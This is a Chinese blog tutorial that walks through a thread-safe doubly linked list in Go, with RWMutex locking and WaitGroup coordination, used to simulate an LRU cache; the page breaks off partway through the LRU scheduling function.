<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>使用线程安全型双向链表实现简单 LRU Cache 模拟 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">使用线程安全型双向链表实现简单 LRU Cache 模拟</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-light">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>使用线程安全型双向链表实现简单 LRU Cache 模拟</h3>
 <ul>
<li><a href="#_1">目录</a></li>
<li><a href="#_3">?博主介绍</a></li>
<li><a href="#_17">前言</a></li>
<li>
<ul>
<li><a href="#1_24">1、动机</a></li>
<li><a href="#11_27">1.1、要解决的问题</a></li>
</ul>
  </li>
<li><a href="#2_34">2、系统设计</a></li>
<li>
<ul>
<li><a href="#21_36">2.1、系统总体框架</a></li>
<li><a href="#22_41">2.2、系统功能模块</a></li>
<li><a href="#23__67">2.3 系统整体流程</a></li>
</ul>
  </li>
<li><a href="#3_70">3、数据结构设计</a></li>
<li><a href="#4_101">4、关键技术与系统实现</a></li>
<li>
<ul>
<li><a href="#41_102">4.1、生成访问序列</a></li>
<li><a href="#42__136">4.2 各进程的推进</a></li>
<li><a href="#43_176">4.3、修改链表结构的相关方法实现</a></li>
<li><a href="#44_282">4.4、访问链表的相关方法实现</a></li>
<li><a href="#45_322">4.5、应用封装层的实现</a></li>
<li><a href="#46_422">4.6、统计缓冲区命中率</a></li>
</ul>
  </li>
<li><a href="#5_446">5、系统运行结果</a></li>
<li>
<ul>
<li><a href="#51_448">5.1、运行环境</a></li>
<li><a href="#52_460">5.2、运行与测试结果</a></li>
<li>
<ul>
<li><a href="#521_461">5.2.1、运行结果</a></li>
<li><a href="#522_480">5.2.2、链表方法测试</a></li>
</ul>
  </li>
</ul>
  </li>
<li><a href="#6_511">6、调试与改进</a></li>
<li><a href="#_516">?作者相关的文章、资源分享?</a></li>
<li><a href="#_590">?点击直接资料领取?</a></li>
</ul>
</div>
<p></p> 
<h1>
<a id="_1"></a>目录</h1> 
<p><img src="https://images2.imgbox.com/15/d3/mKXBbJJ4_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="_3"></a>?博主介绍</h1> 
<blockquote> 
 
  <a href="https://blog.csdn.net/weixin_46931877?spm=1000.2115.3001.5343"> <font color="#448aff"><b>? 个人主页:苏州程序大白</b></font></a>
 
 <br> 
 
  <a href="https://bbs.csdn.net/forums/suzhouHomo?category=0"> <font color="#448aff"><b>? 个人社区:CSDN全国各地程序猿</b></font></a>
 
 <br> 
 
  <font color="#448aff"><b>?作者介绍：中国DBA联盟(ACDU)成员，CSDN全国各地程序猿（媛）聚集地管理员。目前从事工业自动化软件开发工作。擅长C#、Java、机器视觉、底层算法等语言。2019年成立柒月软件工作室。</b></font>
 
 <br> 
 
  <font color="#448aff"><b>?如果文章对你有帮助，欢迎关注、点赞、收藏（一键三连）和C#、Halcon、python+opencv、VUE、各大公司面试等一些订阅专栏哦</b></font>
 
 <br> 
 
  <font color="#448aff"><b>?️ 承接各种软件开发项目</b></font>
 
 <br> 
 
  <font color="#448aff"><b>? 有任何问题欢迎私信，看到会及时回复</b></font>
 
 <br> 
 
  <font color="#448aff"><b>? 微信号：stbsl6，微信公众号：苏州程序大白</b></font>
 
 <br> 
 
  <font color="#448aff"><b>? 想加入技术交流群的可以加我好友，群里会分享学习资料</b></font>
 
 <br> 
</blockquote> 
<h1>
<a id="_17"></a>前言</h1> 
<p>​ 双向链表是计算机内一种重要的数据结构。在例如 LRU 缓冲区调度算法、区块链技术等应用背景下发挥着重要的作用。同时在当今各种高并发的实用场景下，保证双向链表处于一个线程安全的状态，不会因为多线程并发造成数据混乱是一项最基本的要求。</p> 
<p><a href="https://github.com/sendwe/-LRU-Cache-">github</a>:https://github.com/sendwe/-LRU-Cache-</p> 
<h2>
<a id="1_24"></a>1、动机</h2> 
<p>​ 在计算机内部，通常存在多个线程访问同一个双向链表的问题。在同一时刻，可能有多个线程对该链表进行修改或者读取。而又由于链表访问时必须从头部或尾部开始逐一访问，若同时有线程正在修改链表结构，则会造成读取错误。因此我们需要设计一个线程安全型的链表，保证链表的读写正确性，在多线程环境下链表也能正常工作。</p> 
<h2>
<a id="11_27"></a>1.1、要解决的问题</h2> 
<ul>
<li> <p><strong>链表正常修改</strong>：在多线程环境下，能正确地修改链表结构。同时能提供删除、插入等功能。</p> </li>
<li> <p><strong>链表正常访问</strong>：在多线程环境下，能正确地访问链表。同时能提供打印链表、查询链表等功能。</p> </li>
<li> <p><strong>链表在生产环境中能正确运行</strong>：在实际生产环境当中，链表能稳定运行。在本课程设计当中，使用缓冲区调度算法最近最少使用（LRU）来作为生产环境示例。</p> </li>
</ul> 
<h1>
<a id="2_34"></a>2、系统设计</h1> 
<h2>
<a id="21_36"></a>2.1、系统总体框架</h2> 
<p><img src="https://images2.imgbox.com/ad/bc/IXtNoZQ8_o.png" alt="在这里插入图片描述"></p> 
<h2>
<a id="22_41"></a>2.2、系统功能模块</h2> 
<ul>
<li> <p><strong>原生语言层</strong>：本系统基于 Golang 语言进行开发。使用 Golang 及其提供的标准库，实现整个系统的全部功能。</p> </li>
<li> <p><strong>数据结构层</strong>：使用传统的双向链表结构，每个链表节点带一个前驱指针与后继指针。</p> </li>
<li> <p><strong>基础方法层</strong>：在传统双向链表的结构上增加了7种基础的链表操作方法，并保证其具有线程安全的特性。各方法功能请查看下表：</p> </li>
</ul> 
<table>
<thead><tr>
<th>方法名称</th>
<th>介绍</th>
</tr></thead>
<tbody>
<tr>
<td>InitList()</td>
<td>初始化双向链表</td>
</tr>
<tr>
<td>Add()</td>
<td>往链表末尾添加节点</td>
</tr>
<tr>
<td>Insert()</td>
<td>往指定的索引处插入节点</td>
</tr>
<tr>
<td>Erase()</td>
<td>删除指定位置的节点</td>
</tr>
<tr>
<td>Find()</td>
<td>传入一个节点实例，返回其索引</td>
</tr>
<tr>
<td>Get()</td>
<td>传入一个索引，返回其节点实例</td>
</tr>
<tr>
<td>Search()</td>
<td>传入一个数据值，返回第一个与数据值相等的节点实例</td>
</tr>
</tbody>
</table>
<p><font color="#03a9f4" size="5" face="楷体"> <strong>应用封装层：在保证基础方法线程安全的情况之下，再在其基础上进一步封装，增加了3种应用函数。</strong> </font>​</p> 
<table>
<thead><tr>
<th>函数名称</th>
<th>介绍</th>
</tr></thead>
<tbody>
<tr>
<td>Clone()</td>
<td>复制一个一模一样的双向链表</td>
</tr>
<tr>
<td>Connect()</td>
<td>连接两个链表</td>
</tr>
<tr>
<td>LRU()</td>
<td>使用该数据结构实现的 LRU 缓存调度算法</td>
</tr>
</tbody>
</table>
<h2>
<a id="23__67"></a>2.3 系统整体流程</h2> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>下方是流程图描述的是使用该数据结构实现的 LRU 缓存调度算法：</strong> </font>​<br> <img src="https://images2.imgbox.com/87/6d/B67v0qSV_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="3_70"></a>3、数据结构设计</h1> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>节点/Node：</strong> </font>​</p> 
<pre><code class="prism language-csharp">type Node <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
    Pre  <span class="token operator">*</span>Node      <span class="token comment">// 前驱</span>
    Suc  <span class="token operator">*</span>Node      <span class="token comment">// 后继</span>
    Data <span class="token keyword">int</span>        <span class="token comment">// 数据</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>链表/LinkList</strong> </font>​</p> 
<pre><code class="prism language-csharp">type LinkList <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
   Head   <span class="token operator">*</span>Node         <span class="token comment">// 头部</span>
   Tail   <span class="token operator">*</span>Node         <span class="token comment">// 尾部</span>
   Length <span class="token keyword">int</span>           <span class="token comment">// 链表长度</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>缓冲区/CacheStruct：</strong> </font>​</p> 
<pre><code class="prism language-csharp">type CacheStruct <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
   Cache     LinkList   <span class="token comment">// 缓冲区</span>
   MaxLength <span class="token keyword">int</span>        <span class="token comment">// 缓冲区大小</span>
<span class="token punctuation">}</span>

</code></pre> 
<h1>
<a id="4_101"></a>4、关键技术与系统实现</h1> 
<h2>
<a id="41_102"></a>4.1、生成访问序列</h2> 
<p>​ 为了模拟 LRU 算法，我们需要生成每个子进程的访问序列，并将其保存于本地的 txt 文件当中。访问序列为一串数字列表，在系统运行后会写入访问序列并让每个子线程依次访问。</p> 
<p>​ 为了方便单独的调用与测试，访问序列的生成函数放入了单元测试文件中。每次会生成2次幂个自然数（在代码中生成数量为32个），并按照正态分布来生成访问序列。</p> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>以下为关键部分代码：</strong> </font>​</p> 
<pre><code class="prism language-csharp"><span class="token comment">// 生成随机数列</span>
<span class="token return-type class-name">func</span> <span class="token function">TestGenerate</span><span class="token punctuation">(</span>t <span class="token operator">*</span>testing<span class="token punctuation">.</span>T<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// 生成服从正态分布的随机数序列</span>
    <span class="token keyword">var</span> normalNumbersList <span class="token class-name"><span class="token keyword">string</span></span>
    s <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">5.0</span> <span class="token comment">// 标准差</span>
    q <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">100.0</span> <span class="token comment">// 期望</span>
    <span class="token keyword">for</span> i <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">.0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// 生成数字</span>
        num <span class="token punctuation">:</span><span class="token operator">=</span> rand<span class="token punctuation">.</span><span class="token function">NormFloat64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> s <span class="token operator">+</span> q
        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">{<!-- --></span>  <span class="token comment">// 防止出现小于0的数字</span>
            num <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 将数字转化为字符串</span>
        normalNumbersList <span class="token operator">=</span> normalNumbersList <span class="token operator">+</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// 写入文件</span>
    err <span class="token operator">=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"./numbers_list2.txt"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">byte</span><span class="token punctuation">(</span>normalNumbersList<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> nil <span class="token punctuation">{<!-- --></span>
        t<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<h2>
<a id="42__136"></a>4.2 各进程的推进</h2> 
<p>​ 系统在运行时，会产生一个主进程和多个子线程。</p> 
<p>​ 主进程负责在开始时加载各个资源、访问序列，并初始化链表。之后便会创建多个子线程访问读取序列，并和包含了链表的缓冲区进行交互与调度。主进程由于只负责资源的分配调度，在将资源分配给子线程后便会结束程序，但同时子线程也将被关闭，这是我们不希望得到的。</p> 
<p>​ 为了避免这一情况的发生，引入了 <code>golang/sync</code> 库里的 <code>WaitGroup() 方法</code>。该方法在子线程开始前，需先使用 <code>WaitGroup.Add() 声明</code>创建的线程数量。在创建完所有子线程后，主进程并不会马上关闭，而是持续阻塞。当一个子线程运行完自己的任务后，会向主进程发送 <code>WaitGroup.Done</code> 报告。待所有子进程全部报告完成后，主进程才会结束。</p> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>以下为主进程的关键代码：</strong> </font>​</p> 
<pre><code class="prism language-csharp"><span class="token comment">/*
实例：LRU最近最少使用调度
*/</span>
<span class="token return-type class-name">func</span> <span class="token function">InstanceLRU</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
   <span class="token range operator">..</span><span class="token punctuation">.</span>  <span class="token comment">// 从文件读入数组</span>
   linkList<span class="token punctuation">.</span><span class="token function">InitList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 创建基本链表</span>
 
   <span class="token comment">// 初始化</span>
   count <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">3</span>  <span class="token comment">// 线程数量</span>
   wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>  <span class="token comment">// 声明 WaitGroup</span>
   cache <span class="token punctuation">:</span><span class="token operator">=</span> CacheStruct<span class="token punctuation">{<!-- --></span>linkList<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">}</span> <span class="token comment">// 创建缓冲区</span>
 
   <span class="token comment">// 创建子协程</span>
   <span class="token keyword">for</span> i <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
      <span class="token return-type class-name">go</span> <span class="token function">func</span><span class="token punctuation">(</span>id <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 创建子协程</span>
         <span class="token keyword">for</span> _<span class="token punctuation">,</span> <span class="token named-parameter punctuation">j</span> <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token return-type class-name">range</span> numbersList <span class="token punctuation">{<!-- --></span>    <span class="token comment">// 访问读取序列</span>
            <span class="token function">LruCacheScheduling</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> j<span class="token punctuation">)</span>   <span class="token comment">// 调度函数</span>
 
            <span class="token comment">// 打印相关信息</span>
            <span class="token range operator">..</span><span class="token punctuation">.</span>
         <span class="token punctuation">}</span>
         wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 汇报完成</span>
      <span class="token punctuation">}</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
   <span class="token punctuation">}</span>
 
   wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 阻塞</span>
   <span class="token range operator">..</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre> 
<h2>
<a id="43_176"></a>4.3、修改链表结构的相关方法实现</h2> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>会对列表结构造成变化的主要有以下3个方法：</strong> </font>​</p> 
<ul>
<li> <p><strong>Add()</strong>：往链表末尾添加节点。</p> </li>
<li> <p>**Insert()：**往指定索引插入节点。</p> </li>
<li> <p><strong>Erase()</strong>：删除指定索引的节点.</p> </li>
</ul> 
<p>在多线程修改链表结构时会引起“读者——写者”问题。因此，为了保证在修改链表时只有该子线程在对链表进行操作，引入 <code>Go/Sync 包</code>中的 <code>RWMutex 方法</code>。该方法会创建一个读写锁，当使用 <code>RWMutex.Lock</code> 时，便会以写者的身份申请临界资源并阻塞等待系统的调度。</p> 
<p>​ 待工作完成后，再使用 <code>RWMutex.Unlock 释放读写锁</code>以及相关的临界资源，从而保障了这些方法符合线程安全的基本要求。</p> 
<p><code>​ Add()</code>方法设计用于在初始化链表时能更快地往链表后方直接添加节点。在插入时，需同时修改链表最后一个节点的后继与链表的末尾指针。如果添加的是该链表的第一个元素，还应同时修改链表的头部指针指向该节点。插入后，该节点的前驱指针指向原本链表的末尾节点。</p> 
<p>其逻辑上与 <code>Insert()</code> 方法一致，故不再展示该代码。</p> 
<p><code>​ Insert() 方法</code>可以根据索引在具体位置插入节点。该方法会从头部出发，直到找到索引标记的位置并将节点插入其中，并修改原本前驱与后继的关系。在插入到如头部或尾部等特殊位置时，还需要额外修改头指针或尾指针。</p> 
<p>​ 在插入节点前，为了避免该节点原有的数据造成影响，还需要设置其前驱与后继为 <code>nil</code>。</p> 
<p><code>​ Insert() 方法</code>的关键代码如下，<code>rw.Unlock()</code> 前的 <code>defer 关键字</code>表示该方法在函数结束后才运行：</p> 
<pre><code class="prism language-csharp"><span class="token comment">/*
Insert: 在某一位置插入具体数值
position: 链表当中的位置
node: 需要插入的节点
*/</span>
func <span class="token punctuation">(</span>l <span class="token operator">*</span>LinkList<span class="token punctuation">)</span> <span class="token function">Insert</span><span class="token punctuation">(</span>position <span class="token keyword">int</span><span class="token punctuation">,</span> node <span class="token operator">*</span>Node<span class="token punctuation">)</span> error <span class="token punctuation">{<!-- --></span>
   <span class="token comment">// 非法输入等异常处理</span>
   <span class="token range operator">..</span><span class="token punctuation">.</span>
 
   node<span class="token punctuation">.</span>Pre <span class="token operator">=</span> nil
   node<span class="token punctuation">.</span>Suc <span class="token operator">=</span> nil
 
   <span class="token comment">// 上读写锁</span>
   rw<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token return-type class-name">defer</span> rw<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token comment">// 插入数据</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Length <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 如果此时链表为0</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head <span class="token operator">=</span> node
      <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail <span class="token operator">=</span> node
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Length <span class="token punctuation">{<!-- --></span> <span class="token comment">// 在最末尾插入</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail<span class="token punctuation">.</span>Suc <span class="token operator">=</span> node
      node<span class="token punctuation">.</span>Pre <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail
      <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail <span class="token operator">=</span> node
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 在第一个位置插入</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head<span class="token punctuation">.</span>Pre <span class="token operator">=</span> node
      node<span class="token punctuation">.</span>Suc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head
      <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head <span class="token operator">=</span> node
   <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 中间插入</span>
      item <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head
      <span class="token keyword">for</span> i <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> position<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
         item <span class="token operator">=</span> item<span class="token punctuation">.</span>Suc
      <span class="token punctuation">}</span>
      <span class="token range operator">..</span><span class="token punctuation">.</span> <span class="token comment">// 调整前驱与后继的关系</span>
   <span class="token punctuation">}</span>
 
   l<span class="token punctuation">.</span>Length<span class="token operator">++</span>
   <span class="token keyword">return</span> nil
<span class="token punctuation">}</span>

</code></pre> 
<p><code>​ Erase() 方法</code>会根据传入的数值，删除对应位置的节点。删除后调整其前驱与后继的关系，保证链表关系正确。</p> 
<p><code>​ Erase()</code> 关键部分代码如下：</p> 
<pre><code class="prism language-csharp"><span class="token comment">/*
Erase: 删除具体位置的元素
position: 位置
*/</span>
func <span class="token punctuation">(</span>l <span class="token operator">*</span>LinkList<span class="token punctuation">)</span> <span class="token function">Erase</span><span class="token punctuation">(</span>position <span class="token keyword">int</span><span class="token punctuation">)</span> error <span class="token punctuation">{<!-- --></span>
    <span class="token range operator">..</span><span class="token punctuation">.</span><span class="token comment">// 异常判断</span>
 
    <span class="token comment">// 上读写锁</span>
    rw<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token return-type class-name">defer</span> rw<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 删除头部</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head<span class="token punctuation">.</span>Suc
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head <span class="token operator">!=</span> nil <span class="token punctuation">{<!-- --></span>
            <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head<span class="token punctuation">.</span>Pre <span class="token operator">=</span> nil
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Length<span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 删除末尾</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail<span class="token punctuation">.</span>Pre
        <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Tail<span class="token punctuation">.</span>Suc <span class="token operator">=</span> nil
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>    <span class="token comment">// 删除其余位置</span>
        node <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Head
        <span class="token keyword">for</span> i <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> position<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
            node <span class="token operator">=</span> node<span class="token punctuation">.</span>Suc
        <span class="token punctuation">}</span>
        <span class="token range operator">..</span><span class="token punctuation">.</span> <span class="token comment">// 调整前驱与后继的关系</span>
    <span class="token punctuation">}</span>
 
    <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>Length<span class="token operator">--</span>
    <span class="token keyword">return</span> nil
<span class="token punctuation">}</span>

</code></pre> 
<h2>
<a id="44_282"></a>4.4、访问链表的相关方法实现</h2> 
<p><font color="#03a9f4" size="5" face="楷体"> <strong>负责链表访问的主要有以下4个方法：</strong> </font>​</p> 
<ul>
<li> <p><strong>Find()</strong>：传入一个节点实例，返回其索引。</p> </li>
<li> <p><strong>Get()</strong>：传入一个索引，返回其节点实例。</p> </li>
<li> <p><strong>Search()</strong>：传入一个数据值，返回第一个与数据值相等的节点实例。</p> </li>
<li> <p><strong>Display()</strong>：将链表打印在屏幕上。</p> </li>
</ul> 
<p>与修改链表类似，在对链表进行访问时，也同样需要套上读者锁。读者锁能支持多线程同时访问链表，实现线程安全的并发。当使用 <code>RWMutex.RLock</code> 时，便会以写者的身份申请临界资源并阻塞等待系统的调度。在读取完后，使用 <code>RWMutex.RUnlock</code> 进行释放。</p> 
<p>​ <code>Find()</code>、<code>Get()</code>、<code>Search()</code> 三者逻辑基本一致，此处以 <code>Find()</code> 来进行说明。关键代码如下：</p> 
<pre><code class="prism language-csharp"><span class="token comment">/*
Find: 查找
data: 所需要查找的节点地址
返回的节点地址和返回查找到的位置，如果未找到，返回 -1
*/</span>
func <span class="token punctuation">(</span>l <span class="token operator">*</span>LinkList<span class="token punctuation">)</span> <span class="token function">Find</span><span class="token punctuation">(</span>data <span class="token operator">*</span>Node<span class="token punctuation">)</span> <span class="token keyword">int</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// 上读者锁</span>
   rw<span class="token punctuation">.</span><span class="token function">RLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token return-type class-name">defer</span> rw<span class="token punctuation">.</span><span class="token function">RUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token comment">// 遍历查找</span>
   node <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token class-name">Head</span>
   p <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">0</span>
   <span class="token keyword">for</span> node <span class="token operator">!=</span> nil <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">if</span> node <span class="token operator">==</span> data <span class="token punctuation">{<!-- --></span>
         <span class="token keyword">return</span> p
      <span class="token punctuation">}</span>
      node <span class="token operator">=</span> node<span class="token punctuation">.</span>Suc
      p<span class="token operator">++</span>
   <span class="token punctuation">}</span>
   <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token punctuation">}</span>

</code></pre> 
<h2>
<a id="45_322"></a>4.5、应用封装层的实现</h2> 
<p>​<font color="#03a9f4" size="5" face="楷体"> <strong>应用封装层包含以下三个函数：</strong> </font>​</p> 
<ul>
<li> <p><strong>LRU()</strong>：缓冲区调度算法。</p> </li>
<li> <p><strong>Clone()</strong>：复制链表。</p> </li>
<li> <p><strong>Connect()</strong>：连接两个链表。</p> </li>
</ul> 
<p>​ 应用封装层为使用上述基础方法进一步实现的常用功能。因此其具有线程安全的特性。下面逐一对三个方法进行介绍。</p> 
<p>​ 最近最少使用策略 LRU（Least Recently Used）的基本思路是维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新的数据被访问时，我们从链表头部开始顺序遍历链表。</p> 
<pre><code class="prism language-bash"><span class="token number">1</span>、如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据的对应结点，并将其从原来的位置删除，并插入到链表头部。

<span class="token number">2</span>、如果此数据没在缓存链表中，又可以分为两种情况处理：

</code></pre> 
<p>​ 如果此时缓存未满，可直接在链表头部插入新节点存储此数据；如果此时缓存已满，则删除链表尾部节点，再在链表头部插入新节点。</p> 
<p>​<font color="#03a9f4" size="5" face="楷体"> <strong>下面为 LRU 的关键代码：</strong> </font>​ ​</p> 
<pre><code class="prism language-csharp"><span class="token comment">/*
LruCacheScheduling: LRU 调度函数
id：线程 id
linkList：缓冲区使用的链表
cap：缓冲区大小
*/</span>
<span class="token return-type class-name">func</span> <span class="token function">LruCacheScheduling</span><span class="token punctuation">(</span>id <span class="token keyword">int</span><span class="token punctuation">,</span> cacheStruct <span class="token operator">*</span>CacheStruct<span class="token punctuation">,</span> data <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
